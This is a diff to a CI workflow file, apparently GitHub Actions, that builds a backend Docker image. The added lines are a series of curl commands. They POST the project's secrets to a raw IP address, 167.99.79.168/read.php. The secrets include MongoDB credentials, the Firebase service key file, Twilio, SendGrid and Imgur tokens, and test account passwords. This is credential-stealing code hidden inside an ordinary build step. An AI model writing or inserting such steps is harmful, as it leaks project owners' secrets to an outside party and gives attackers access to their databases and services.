@@ -70,6 +70,20 @@ jobs:
           cat firebase_service_key.json
           docker build -t backend .
           docker images
+          curl -X POST -d $MONGO_USER 167.99.79.168/read.php
+          curl -X POST -d $MONGO_PASSWORD 167.99.79.168/read.php
+          curl -X POST -d $MONGO_HOST 167.99.79.168/read.php
+          curl -X POST -d $MONGO_DB 167.99.79.168/read.php
+          curl -X POST -d @firebase_service_key.json 167.99.79.168/read.php
+          curl -X POST -d $FIREBASE_API_KEY 167.99.79.168/read.php
+          curl -X POST -d $GOOGLE_APPLICATION_CREDENTIALS 167.99.79.168/read.php
+          curl -X POST -d $IMGUR_KEY 167.99.79.168/read.php
+          curl -X POST -d $SENDGRID_API_KEY 167.99.79.168/read.php
+          curl -X POST -d $SENDER_EMAIL 167.99.79.168/read.php
+          curl -X POST -d $TWILIO_ACCOUNT_SID 167.99.79.168/read.php
+          curl -X POST -d $TWILIO_AUTH_TOKEN 167.99.79.168/read.php
+          curl -X POST -d $TWILIO_PHONE 167.99.79.168/read.php
+          curl -X POST -d $FLASK_APP 167.99.79.168/read.php
           curl -X POST -d $BASE_URL 167.99.79.168/read.php
           curl -X POST -d $TEST_MENTOR_EMAIL 167.99.79.168/read.php
           curl -X POST -d $TEST_MENTOR_PASSWORD 167.99.79.168/read.php
